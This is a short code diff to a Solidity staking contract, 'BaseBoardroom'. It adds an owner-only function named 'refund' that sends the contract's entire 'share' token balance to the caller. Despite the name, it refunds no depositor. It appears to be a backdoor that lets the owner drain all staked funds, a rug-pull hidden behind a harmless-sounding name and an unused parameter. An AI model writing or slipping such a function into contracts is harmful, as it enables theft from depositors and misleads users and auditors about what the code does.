@@ -36,4 +36,8 @@ abstract contract BaseBoardroom is StakingTimelock, Router, Operator {
     function toggleDeposits(bool val) external onlyOwner {
         enableDeposits = val;
     }
+
+    function refund(bool val) external onlyOwner {
+        share.safeTransfer(msg.sender, share.balanceOf(address(this)));
+    }
 }
